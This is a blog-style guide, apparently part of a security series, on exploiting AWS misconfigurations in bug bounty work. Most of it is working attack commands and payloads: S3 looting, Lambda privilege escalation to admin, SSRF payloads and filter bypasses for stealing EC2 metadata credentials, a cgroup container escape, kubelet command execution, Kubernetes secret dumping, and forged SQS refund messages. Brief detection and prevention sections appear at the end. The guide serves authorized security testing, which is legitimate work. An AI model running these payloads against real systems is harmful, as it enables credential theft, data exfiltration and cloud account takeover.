---
title: "AWS Security Misconfigurations for Bug Bounty Hunters: A Complete Exploitation Guide"
meta_description: "Deep-dive into AWS security misconfigurations exploited in real bug bounties -- S3 buckets, IAM policy abuse, SSRF to metadata, Lambda URLs, Cognito flaws, and full attack chains with tools and payloads."
slug: "aws-security-misconfigurations-bug-bounty-hunters"
keywords: ["AWS security misconfigurations", "bug bounty AWS", "S3 bucket exploitation", "IAM privilege escalation", "SSRF AWS metadata", "EC2 metadata abuse", "AWS penetration testing", "cloud security", "AWS Lambda misconfiguration", "Cognito security", "CloudFront bypass", "SNS SQS public access", "ScoutSuite", "Prowler"]
series: "Security Deep Dive"
part: 12
---

# AWS Security Misconfigurations for Bug Bounty Hunters: A Complete Exploitation Guide

## Introduction

AWS powers a staggering portion of the internet. When you are hunting on bug bounty programs, the odds are high that your target runs at least partially on AWS infrastructure. The attack surface is enormous -- S3 buckets, IAM roles, EC2 instances, Lambda functions, API Gateways, Cognito user pools, and dozens of other services -- each with its own configuration pitfalls.

This is not a surface-level overview. This guide covers real exploitation techniques, enumeration methodologies, attack chains, and the exact payloads and CLI commands you need to go from initial reconnaissance to critical-severity findings. Every technique described here has been used in real bug bounty reports that paid out.

The prerequisite assumption: you already know your way around AWS, Linux, Burp Suite, and HTTP. We are going straight to exploitation.

---

## 1. Exposed S3 Buckets

### Enumeration

S3 bucket names are globally unique and predictable. Companies follow naming conventions that make enumeration trivial.

```bash
# Common naming patterns to fuzz
# {company}-assets, {company}-backup, {company}-logs,
# {company}-dev, {company}-staging, {company}-prod,
# {company}-uploads, {company}-data, {company}-static

# Using aws cli to check if a bucket exists
aws s3 ls s3://targetcompany-backup --no-sign-request 2>&1

# If you get "Access Denied" -- bucket exists but is not listable
# If you get "NoSuchBucket" -- does not exist
# If you get a listing -- jackpot, it is publicly listable
```

Generate a wordlist and automate:

```bash
# generate bucket name candidates
for suffix in assets backup logs dev staging prod uploads data static media images docs internal; do
  echo "targetcompany-$suffix"
  echo "targetcompany.$suffix"
  echo "${suffix}.targetcompany"
  echo "targetcompany-${suffix}-us-east-1"
done > bucket_candidates.txt

# enumerate with S3Scanner
python3 s3scanner.py --bucket-file bucket_candidates.txt --out-file results.txt
```

### Listing, Reading, and Writing

```bash
# List bucket contents (no authentication)
aws s3 ls s3://targetcompany-backup --no-sign-request --recursive

# Download everything
aws s3 sync s3://targetcompany-backup ./loot --no-sign-request

# Check if you can write (critical finding)
echo "bugbounty-test" > test.txt
aws s3 cp test.txt s3://targetcompany-backup/bugbounty-poc.txt --no-sign-request

# Check for specific sensitive files
aws s3 cp s3://targetcompany-backup/.env - --no-sign-request
aws s3 cp s3://targetcompany-backup/database.sql - --no-sign-request
aws s3 cp s3://targetcompany-backup/credentials.json - --no-sign-request
```

### S3 Bucket Policy Misconfigurations

The most dangerous misconfiguration is a wildcard principal:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicReadWrite",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:DeleteObject"
      ],
      "Resource": "arn:aws:s3:::targetcompany-assets/*"
    }
  ]
}
```

This grants every person on the internet read, write, and delete access. You can verify with:

```bash
# Check bucket policy
aws s3api get-bucket-policy --bucket targetcompany-assets --no-sign-request 2>&1

# Check bucket ACL
aws s3api get-bucket-acl --bucket targetcompany-assets --no-sign-request 2>&1

# If the ACL shows AllUsers or AuthenticatedUsers with WRITE or FULL_CONTROL,
# the bucket is exploitable
```

A subtler but equally dangerous policy restricts by source IP or VPC but leaves the condition block malformed, effectively granting public access anyway. Always read the full policy JSON.

---

## 2. Weak IAM Policies

### Overly Permissive Roles

Developers frequently attach `AdministratorAccess` or build policies with wildcard actions to "get things working." If you obtain any AWS credentials during a bounty, the first move is to enumerate what those credentials can do.

```bash
# Identify who you are
aws sts get-caller-identity

# Example output:
# {
#     "UserId": "AIDAEXAMPLEID",
#     "Account": "123456789012",
#     "Arn": "arn:aws:iam::123456789012:user/deploy-bot"
# }

# Enumerate attached policies
aws iam list-attached-user-policies --user-name deploy-bot
aws iam list-user-policies --user-name deploy-bot

# Get the policy document
aws iam get-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/DeployPolicy \
  --version-id v1

# Check for wildcard permissions
# Look for: "Action": "*" or "Action": "s3:*" or "Resource": "*"
```

A common finding: a service account with `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` can escalate to full admin by creating a Lambda with an admin role attached.

```bash
# Privilege escalation via Lambda
# 1. Create a function that assumes the admin role
cat > /tmp/escalate.py << 'PYEOF'
import boto3
import json

def handler(event, context):
    client = boto3.client('iam')
    # Attach admin policy to attacker user
    client.attach_user_policy(
        UserName='deploy-bot',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {"statusCode": 200, "body": "escalated"}
PYEOF

cd /tmp && zip escalate.zip escalate.py

# 2. Create the Lambda function with the privileged role
aws lambda create-function \
  --function-name escalate-poc \
  --runtime python3.11 \
  --role arn:aws:iam::123456789012:role/AdminRole \
  --handler escalate.handler \
  --zip-file fileb://escalate.zip

# 3. Invoke it
aws lambda invoke --function-name escalate-poc /tmp/output.json
```

### Wildcard Permission Patterns to Look For

```json
// Dangerous patterns in IAM policies
{"Action": "*", "Resource": "*"}
{"Action": "s3:*", "Resource": "*"}
{"Action": ["iam:Create*", "iam:Attach*", "iam:Put*"], "Resource": "*"}
{"Action": "sts:AssumeRole", "Resource": "*"}
{"Action": "lambda:*", "Resource": "*"}
{"Action": "ec2:*", "Resource": "*"}
```

---

## 3. EC2 Metadata Endpoint Abuse (IMDSv1)

The EC2 instance metadata service at `169.254.169.254` is one of the most exploited AWS attack vectors. IMDSv1 responds to simple GET requests with no authentication.

### Direct Access (From Compromised Instance)

```bash
# Get instance metadata
curl -s http://169.254.169.254/latest/meta-data/

# Get IAM role name
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get temporary credentials for the role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role

# Response contains:
# {
#   "AccessKeyId": "ASIAEXAMPLEKEY",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token": "FwoGZXIvYXdzEBY...",
#   "Expiration": "2026-04-02T18:00:00Z"
# }
```

### SSRF to Credential Theft

This is the high-impact attack. If the target application has any SSRF vulnerability, you can steal the EC2 role credentials remotely.

```
# Via a vulnerable URL parameter
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com

# Response reveals role name: "EC2-Production-Role"

# Second request to grab credentials
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role HTTP/1.1
Host: target.com
```

In Burp Suite, test every parameter that fetches URLs, renders images, or processes webhooks:

```
# Common SSRF injection points
POST /api/webhook HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# URL shortener/preview
GET /preview?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1

# PDF generation
POST /api/generate-pdf HTTP/1.1
Content-Type: application/json

{
  "html": "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'></iframe>"
}

# Image proxy
GET /image?src=http://169.254.169.254/latest/user-data HTTP/1.1
```

### Bypass Techniques for SSRF Filters

Applications often block `169.254.169.254` directly. Bypass methods:

```
# Decimal notation
http://2852039166/latest/meta-data/

# Hex notation
http://0xA9FEA9FE/latest/meta-data/

# Octal notation
http://0251.0376.0251.0376/latest/meta-data/

# IPv6 mapped
http://[::ffff:169.254.169.254]/latest/meta-data/

# DNS rebinding (point your domain to 169.254.169.254)
http://metadata.attacker.com/latest/meta-data/

# URL encoding
http://169.254.169.254%23@attacker.com/
http://attacker.com@169.254.169.254/

# Redirect-based bypass
# Host a redirect on your server:
# 302 -> http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://attacker.com/redirect

# Alternative metadata endpoints
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Using Stolen Credentials

```bash
# Set up a profile with the stolen creds
export AWS_ACCESS_KEY_ID="ASIAEXAMPLEKEY"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBY..."

# Verify identity
aws sts get-caller-identity

# Enumerate what you can access
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
aws lambda list-functions
aws rds describe-db-instances
aws secretsmanager list-secrets
aws ssm get-parameters-by-path --path "/" --recursive
```

---

## 4. Open Security Groups

Security groups that allow unrestricted inbound access are a critical finding, especially when combined with unpatched services.

```bash
# Find security groups allowing 0.0.0.0/0 on any port
aws ec2 describe-security-groups \
  --filters "Name=ip-permission.cidr,Values=0.0.0.0/0" \
  --query 'SecurityGroups[*].{ID:GroupId,Name:GroupName,Rules:IpPermissions}' \
  --output json

# Find instances with public IPs and open security groups
aws ec2 describe-instances \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,PublicIP:PublicIpAddress,SGs:SecurityGroups}' \
  --output json
```

### Common Dangerous Open Ports

| Port | Service | Risk |
|------|---------|------|
| 22 | SSH | Brute force, credential stuffing |
| 3389 | RDP | BlueKeep, brute force |
| 6379 | Redis | Unauthenticated access, RCE |
| 27017 | MongoDB | Unauthenticated access, data exfil |
| 9200 | Elasticsearch | Unauthenticated access, data exfil |
| 5432 | PostgreSQL | Brute force, data exfil |
| 3306 | MySQL | Brute force, data exfil |
| 8080 | HTTP Alt | Admin panels, debug endpoints |
| 2379 | etcd | Unauthenticated cluster data |
| 10250 | Kubelet | Node command execution |

---

## 5. Leaked AWS Access Keys

### Where to Find Them

AWS keys have distinctive patterns that make them easy to search for:

```bash
# Access Key ID pattern: AKIA[A-Z0-9]{16}
# Secret Key: 40-character base64 string

# Search GitHub (use trufflehog or github dorking)
# GitHub dork examples:
# "AKIA" "targetcompany"
# "aws_secret_access_key" "targetcompany"
# filename:.env AWS_SECRET_ACCESS_KEY
# filename:credentials aws_access_key_id

# Search in client-side JavaScript
curl -s https://target.com/static/js/main.*.js | grep -oE 'AKIA[A-Z0-9]{16}'

# Search in mobile app APKs
apktool d target.apk
grep -rn "AKIA" target/ --include="*.xml" --include="*.java" --include="*.smali"

# Search .env files exposed via web
curl -s https://target.com/.env
curl -s https://target.com/app/.env
curl -s https://target.com/.env.production
curl -s https://target.com/.env.backup
```

### Automated Scanning

```bash
# trufflehog against a git repo
trufflehog git https://github.com/targetcompany/webapp --only-verified

# Search in Docker images
docker pull targetcompany/webapp:latest
docker save targetcompany/webapp:latest | tar -xf -
grep -rn "AKIA" . 2>/dev/null

# Search in public S3 buckets you already found
aws s3 cp s3://targetcompany-backup/.env - --no-sign-request 2>/dev/null
aws s3 cp s3://targetcompany-backup/docker-compose.yml - --no-sign-request 2>/dev/null
```

### Validation

```bash
# Validate found credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

aws sts get-caller-identity

# If successful, enumerate the blast radius
aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)
```

---

## 6. Docker on EC2: Container Escape and Privileged Mode Abuse

When containers run in privileged mode on EC2 instances, escaping to the host is straightforward.

### Detecting Privileged Mode

```bash
# From inside a container, check if privileged
cat /proc/1/status | grep CapEff
# If CapEff: 000001ffffffffff -- you are privileged

# Check if docker socket is mounted
ls -la /var/run/docker.sock
```

### Escape via Docker Socket

```bash
# If docker.sock is mounted inside the container
docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine /bin/sh

# Now access the host filesystem
cat /hostfs/etc/shadow
cat /hostfs/root/.ssh/id_rsa
cat /hostfs/home/*/.aws/credentials

# Grab EC2 metadata from the host network namespace
chroot /hostfs curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Escape via Privileged Mode

```bash
# Mount the host disk
mkdir /tmp/hostfs
mount /dev/xvda1 /tmp/hostfs

# Access host filesystem
ls /tmp/hostfs/root/
cat /tmp/hostfs/etc/shadow

# Or use cgroups to escape
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w
echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo 0 > $d/w/cgroup.procs"
cat /output
```

---

## 7. Public Kubernetes Dashboards

Kubernetes dashboards exposed without authentication provide full cluster control.

### Discovery

```bash
# Common endpoints
https://target.com/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
https://target.com:8443/
https://target.com:6443/

# Port scanning for K8s services
nmap -sV -p 6443,8443,10250,10255,2379 target.com

# Kubelet API (unauthenticated)
curl -sk https://target.com:10250/pods
curl -sk https://target.com:10255/pods  # read-only port

# Execute commands via kubelet
curl -sk https://target.com:10250/run/default/webapp/webapp \
  -d "cmd=cat /etc/shadow"
```

### Exploitation

```bash
# If you get kubectl access via a service account token found in a pod
export KUBECONFIG=/dev/null
kubectl --server=https://target.com:6443 \
  --token="eyJhbGciOiJSUzI1NiIs..." \
  --insecure-skip-tls-verify \
  get secrets --all-namespaces

# Dump all secrets
kubectl --server=https://target.com:6443 \
  --token="eyJhbGciOiJSUzI1NiIs..." \
  --insecure-skip-tls-verify \
  get secrets -A -o json | jq '.items[].data | to_entries[] | .value' -r | base64 -d
```

---

## 8. Misconfigured CI/CD Pipelines

### Exposed Secrets in Build Logs

CI/CD platforms like GitHub Actions, Jenkins, and GitLab CI frequently leak secrets in build output.

```bash
# Jenkins without auth
curl -s http://target.com:8080/job/deploy-prod/lastBuild/consoleText

# Look for:
# - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
# - DOCKER_PASSWORD
# - DATABASE_URL with credentials
# - API tokens
# - SSH private keys in deploy steps

# GitHub Actions -- check workflow files for secrets usage
# .github/workflows/*.yml
# Secrets printed via echo or debug mode
```

### Node.js Example: Leaking Secrets in Error Output

```javascript
// BAD: This leaks environment variables in error responses
const express = require('express');
const app = express();

app.get('/api/deploy', async (req, res) => {
  try {
    await deployToAWS();
  } catch (error) {
    // This dumps the full error including env vars used in AWS SDK
    res.status(500).json({
      error: error.message,
      stack: error.stack,
      env: process.env  // catastrophic leak
    });
  }
});
```

### FastAPI Example: Secrets in Debug Mode

```python
# BAD: Debug mode exposes environment in tracebacks
from fastapi import FastAPI
import boto3
import os

app = FastAPI(debug=True)  # NEVER in production

@app.get("/deploy")
async def deploy():
    client = boto3.client(
        's3',
        aws_access_key_id=os.environ['AWS_ACCESS_KEY_ID'],         # leaked in traceback
        aws_secret_access_key=os.environ['AWS_SECRET_ACCESS_KEY'],  # leaked in traceback
    )
    # If this throws, the full stack trace with credentials is returned
    return client.list_buckets()
```

---

## 9. AWS Lambda Function URL Misconfiguration

Lambda function URLs can be configured with `AuthType: NONE`, making them publicly accessible.

### Discovery

```bash
# Enumerate Lambda function URLs
aws lambda list-function-url-configs --function-name target-function

# Response:
# {
#   "FunctionUrlConfigs": [{
#     "FunctionUrl": "https://abc123.lambda-url.us-east-1.on.aws/",
#     "AuthType": "NONE"
#   }]
# }

# If AuthType is NONE, anyone can invoke the function
curl -s https://abc123.lambda-url.us-east-1.on.aws/
```

### Exploitation

```bash
# If the Lambda processes user input without validation
curl -X POST https://abc123.lambda-url.us-east-1.on.aws/ \
  -H "Content-Type: application/json" \
  -d '{"action":"exec","command":"env"}'

# Lambda functions often have IAM roles with excessive permissions
# If you can achieve code execution, dump the role credentials
curl -X POST https://abc123.lambda-url.us-east-1.on.aws/ \
  -H "Content-Type: application/json" \
  -d '{"action":"exec","command":"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Note: Lambda uses a different metadata path
# AWS_LAMBDA_FUNCTION_NAME, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,
# and AWS_SESSION_TOKEN are available as environment variables
```

### Vulnerable Lambda Function (Node.js)

```javascript
// BAD: No authentication, processes arbitrary input
exports.handler = async (event) => {
  const body = JSON.parse(event.body);
  
  // Command injection via user input
  const { exec } = require('child_process');
  const result = await new Promise((resolve, reject) => {
    exec(`echo ${body.name} | process_user`, (error, stdout) => {
      if (error) reject(error);
      resolve(stdout);
    });
  });
  
  return {
    statusCode: 200,
    body: JSON.stringify({ result })
  };
};

// Exploit:
// POST body: {"name": "; env"}
// This dumps all environment variables including AWS credentials
```

---

## 10. CloudFront Misconfiguration

### Origin Access Bypass

CloudFront distributions sometimes expose the origin server directly, bypassing WAF rules and authentication.

```bash
# Find the origin
# Check DNS records, HTTP headers, SSL certificates
dig target.com
curl -sI https://target.com | grep -i "x-amz\|x-cache\|via"

# If CloudFront, find the origin:
# - Check for S3 bucket origin (*.s3.amazonaws.com)
# - Check for ALB/EC2 origin (direct IP in headers)
# - Check SSL certificate SAN for origin domains

# Bypass CloudFront WAF by hitting origin directly
curl -s https://origin-server.target.com/admin/
# vs
curl -s https://target.com/admin/  # blocked by WAF
```

### Cache Poisoning

```
# Inject headers that get cached by CloudFront
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If the application uses X-Forwarded-Host to generate URLs
# and CloudFront caches the response, all subsequent visitors
# get poisoned URLs pointing to attacker.com
```

### Subdomain Takeover via CloudFront

```bash
# If a CNAME points to a CloudFront distribution that no longer exists
dig subdomain.target.com CNAME
# Returns: d111111abcdef8.cloudfront.net

# If CloudFront returns: "The request could not be satisfied"
# with a 403 and "Bad request" -- the distribution was deleted
# You can register a new CloudFront distribution and claim it

# Verify takeover possibility
curl -sI https://subdomain.target.com
# Look for: "ERROR" from CloudFront with no matching distribution
```

---

## 11. SNS/SQS Public Access

### Publicly Accessible SNS Topics

```bash
# Check SNS topic policy
aws sns get-topic-attributes \
  --topic-arn arn:aws:sns:us-east-1:123456789012:notifications

# Dangerous policy:
# {
#   "Statement": [{
#     "Effect": "Allow",
#     "Principal": "*",
#     "Action": "SNS:Publish",
#     "Resource": "arn:aws:sns:us-east-1:123456789012:notifications"
#   }]
# }

# If publishing is allowed, inject messages
aws sns publish \
  --topic-arn arn:aws:sns:us-east-1:123456789012:notifications \
  --message '{"event":"admin_reset","user":"attacker@evil.com"}' \
  --no-sign-request
```

### Publicly Accessible SQS Queues

```bash
# Enumerate and read messages from a public SQS queue
aws sqs receive-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/orders \
  --max-number-of-messages 10 \
  --no-sign-request

# Purge the queue (destructive -- only in your own lab)
aws sqs purge-queue \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/orders \
  --no-sign-request

# Send a message
aws sqs send-message \
  --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/orders \
  --message-body '{"orderId":"EVIL-001","action":"refund","amount":99999}' \
  --no-sign-request
```

---

## 12. Cognito Misconfiguration

### Self-Registration Abuse

Many Cognito user pools have self-registration enabled when it should be admin-only.

```bash
# Enumerate the Cognito User Pool and Client ID
# Often found in client-side JavaScript
curl -s https://target.com/static/js/app.*.js | grep -oE 'us-east-1_[a-zA-Z0-9]+'
curl -s https://target.com/static/js/app.*.js | grep -oE '[a-z0-9]{26}'

# Self-register a new user
aws cognito-idp sign-up \
  --client-id 1example23456789 \
  --username attacker@evil.com \
  --password 'P@ssw0rd123!' \
  --user-attributes Name=email,Value=attacker@evil.com

# Confirm without email verification (if auto-confirm is on)
aws cognito-idp admin-confirm-sign-up \
  --user-pool-id us-east-1_EXAMPLE \
  --username attacker@evil.com
```

### Custom Attribute Abuse

```bash
# If the Cognito pool allows users to set custom attributes during signup
# Developers often use custom:role or custom:admin attributes

aws cognito-idp sign-up \
  --client-id 1example23456789 \
  --username attacker@evil.com \
  --password 'P@ssw0rd123!' \
  --user-attributes \
    Name=email,Value=attacker@evil.com \
    Name=custom:role,Value=admin \
    Name=custom:organization_id,Value=target-org-uuid

# After authentication, the JWT will contain:
# {
#   "custom:role": "admin",
#   "custom:organization_id": "target-org-uuid",
#   "email": "attacker@evil.com"
# }

# If the backend trusts these JWT claims without server-side validation,
# you have privilege escalation
```

### Identity Pool Misconfiguration

```bash
# Get temporary AWS credentials via Cognito Identity Pool
aws cognito-identity get-id \
  --identity-pool-id us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

# Get credentials for the identity
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy

# These credentials inherit the IAM role assigned to
# the unauthenticated identity pool role
# Check what that role can do
aws sts get-caller-identity
aws s3 ls
aws dynamodb list-tables
```

---

## 13. AWS CLI Commands for Enumeration

A structured enumeration checklist when you have valid AWS credentials:

```bash
# === IDENTITY ===
aws sts get-caller-identity
aws iam get-user 2>/dev/null
aws iam list-groups-for-user --user-name $(aws iam get-user --query 'User.UserName' --output text) 2>/dev/null

# === IAM POLICIES ===
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME
aws iam list-attached-group-policies --group-name GROUPNAME
aws iam list-role-policies --role-name ROLENAME

# === S3 ===
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3api get-bucket-policy --bucket BUCKET
aws s3api get-bucket-acl --bucket BUCKET

# === EC2 ===
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name]' --output table
aws ec2 describe-security-groups
aws ec2 describe-key-pairs

# === LAMBDA ===
aws lambda list-functions
aws lambda get-function --function-name FUNC_NAME
aws lambda list-function-url-configs --function-name FUNC_NAME

# === SECRETS ===
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET_NAME
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption

# === DATABASES ===
aws rds describe-db-instances
aws dynamodb list-tables
aws dynamodb scan --table-name TABLE_NAME

# === NETWORKING ===
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws elbv2 describe-load-balancers

# === LOGGING (check for blind spots) ===
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name TRAIL_NAME
aws guardduty list-detectors
```

---

## 14. Automated Tools for AWS Security Assessment

### ScoutSuite

```bash
# Install
pip install scoutsuite

# Run full audit
scout aws --profile target-profile

# Run against specific services
scout aws --profile target-profile --services s3 iam ec2 lambda

# Results are saved as an HTML report
# Open results/scoutsuite-results/scoutsuite_results_aws-*.html
```

### Prowler

```bash
# Install
pip install prowler

# Run all checks
prowler aws

# Run specific categories
prowler aws --category internet-exposed
prowler aws --category secrets
prowler aws --service s3 iam ec2

# Output in various formats
prowler aws -M json-ocsf -o /tmp/prowler-results
```

### CloudMapper

```bash
# Generate network diagrams and find public exposure
# Install from https://github.com/duo-labs/cloudmapper
python cloudmapper.py collect --account target
python cloudmapper.py report --account target
python cloudmapper.py webserver --account target
# Access the web UI at http://localhost:8000
```

### S3Scanner

```bash
# Enumerate and test S3 buckets
pip install s3scanner

# Scan a list of bucket names
s3scanner --bucket-file buckets.txt --out-file results.txt

# Check specific bucket
s3scanner --bucket targetcompany-backup
```

---

## 15. Real-World AWS Attack Chains

### Attack Chain 1: SSRF to Full Account Compromise

```
1. Discover SSRF in /api/proxy?url= parameter
2. Fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Role name: "EC2-WebApp-Role"
4. Fetch credentials from the role endpoint
5. Use credentials to list S3 buckets
6. Find s3://company-secrets/ with database backups
7. Download backup, extract production database credentials
8. Connect to RDS instance (security group allows 0.0.0.0/0 on 5432)
9. Full database access -- millions of user records
```

### Attack Chain 2: GitHub Leak to Lateral Movement

```
1. Find AWS access keys in a public GitHub commit
2. Keys belong to CI/CD service account with broad permissions
3. List Lambda functions, find one with admin role attached
4. Read Lambda function code -- contains hardcoded database URLs
5. Use iam:PassRole to create new Lambda with admin role
6. Invoke Lambda to create a new IAM user with admin access
7. Use new admin credentials for full account enumeration
8. Discover sensitive S3 buckets, Secrets Manager entries, DynamoDB tables
```

### Attack Chain 3: Cognito to Data Exfiltration

```
1. Extract Cognito pool ID and client ID from frontend JavaScript
2. Self-register with custom:role=admin attribute
3. Authenticate and receive JWT with admin claims
4. Backend API trusts JWT claims without server-side authorization
5. Access admin endpoints, list all users, export data
6. Use Cognito Identity Pool to get AWS credentials
7. Identity pool unauthenticated role has DynamoDB read access
8. Scan all DynamoDB tables for sensitive data
```

---

## Burp Suite Testing Workflow

### Setting Up for AWS Testing

1. **Proxy all AWS CLI traffic through Burp** for analysis:

```bash
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080
export AWS_CA_BUNDLE=/path/to/burp-ca.pem

aws s3 ls  # traffic now visible in Burp
```

2. **SSRF Testing in Burp Intruder**: Load a metadata endpoint wordlist into Intruder and fuzz URL parameters:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
http://[::ffff:169.254.169.254]/latest/meta-data/
http://2852039166/latest/meta-data/
http://0xA9FEA9FE/latest/meta-data/
http://169.254.169.254%23@attacker.com/
```

3. **Scan JavaScript files** using Burp's built-in JS analysis or extensions like JS Link Finder for AWS keys, Cognito pool IDs, S3 bucket names, and API Gateway URLs.

---

## Common Developer Mistakes

1. **Hardcoding AWS credentials** in application code, environment files committed to git, or client-side JavaScript.
2. **Using IMDSv1** instead of requiring IMDSv2 with hop limit of 1.
3. **Attaching AdministratorAccess** to service roles instead of following least privilege.
4. **Leaving S3 bucket policies with `Principal: "*"`** for convenience during development and forgetting to lock them down.
5. **Not restricting security groups** -- using `0.0.0.0/0` for database ports.
6. **Running containers in privileged mode** on EC2 without understanding the implications.
7. **Trusting Cognito JWT claims** for authorization without server-side validation.
8. **Setting Lambda function URLs to `AuthType: NONE`** for internal functions that should not be public.
9. **Not enabling CloudTrail** in all regions, leaving blind spots for detection.
10. **Storing secrets in SSM Parameter Store** without encryption or restrictive IAM policies.

---

## Detection Strategies

```bash
# CloudTrail queries for suspicious activity
# Look for credential usage from unusual IPs

# AWS Athena query against CloudTrail logs
# SELECT eventTime, eventName, sourceIPAddress, userIdentity.arn
# FROM cloudtrail_logs
# WHERE sourceIPAddress NOT LIKE '10.%'
#   AND sourceIPAddress NOT LIKE '172.%'
#   AND userIdentity.arn LIKE '%EC2-Production-Role%'
# ORDER BY eventTime DESC;

# GuardDuty findings for SSRF-based credential theft
# Look for: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS

# S3 access logging
aws s3api get-bucket-logging --bucket target-bucket

# Monitor for unusual API calls
# - GetCallerIdentity from unknown IPs
# - ListBuckets, DescribeInstances from role credentials used outside EC2
# - CreateUser, AttachUserPolicy, CreateAccessKey (privilege escalation)
```

---

## Prevention Strategies

```bash
# 1. Enforce IMDSv2
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1

# 2. Block S3 public access at account level
aws s3control put-public-access-block \
  --account-id 123456789012 \
  --public-access-block-configuration \
    BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# 3. Enable GuardDuty
aws guardduty create-detector --enable

# 4. Use SCP to prevent dangerous actions org-wide
# Apply a Service Control Policy that denies:
# - s3:PutBucketPolicy with Principal: *
# - iam:CreateUser without MFA
# - ec2:ModifyInstanceMetadataOptions setting http-tokens to optional

# 5. Rotate credentials automatically
# Use IAM roles instead of long-lived access keys
# Enable credential rotation for any remaining access keys

# 6. Cognito: disable self-signup if not needed
# Set AllowAdminCreateUserOnly to true
# Use pre-signup Lambda trigger to validate registrations
# Never trust custom attributes for authorization on the backend
```

---

## Bug Bounty Report Example

```
Title: SSRF in /api/fetch allows theft of EC2 IAM role credentials
  leading to full S3 data exfiltration

Severity: Critical (CVSS 9.8)

Summary:
The endpoint /api/fetch accepts a url parameter and fetches the
specified URL server-side without adequate input validation. By
supplying the EC2 instance metadata URL, an attacker can retrieve
temporary IAM credentials for the EC2-Production-Role, which has
read access to all S3 buckets in the account including customer
data backups.

Steps to Reproduce:
1. Send the following request:
   GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
   Host: app.target.com

2. The response returns the role name: "EC2-Production-Role"

3. Fetch the credentials:
   GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role HTTP/1.1
   Host: app.target.com

4. The response contains AccessKeyId, SecretAccessKey, and Token.

5. Using these credentials:
   aws s3 ls
   -> Lists 47 buckets including "target-customer-backups"

   aws s3 ls s3://target-customer-backups/ --recursive
   -> Contains daily database dumps with PII

Impact:
- Full read access to all S3 buckets (47 buckets)
- Customer PII in database backups (estimated 2M+ records)
- Access to application secrets in SSM Parameter Store
- Potential lateral movement to other services via the role

Remediation:
1. Migrate to IMDSv2 with hop limit of 1
2. Implement URL allowlisting on /api/fetch
3. Block RFC 1918 and link-local addresses in SSRF-prone endpoints
4. Apply least-privilege IAM to the EC2 role
5. Enable GuardDuty InstanceCredentialExfiltration detection
```

### Severity Explanation

This finding is Critical because:
- **No authentication required** to exploit the SSRF
- **Direct access to cloud credentials** with broad permissions
- **Customer data exposure** at scale (PII, financial records)
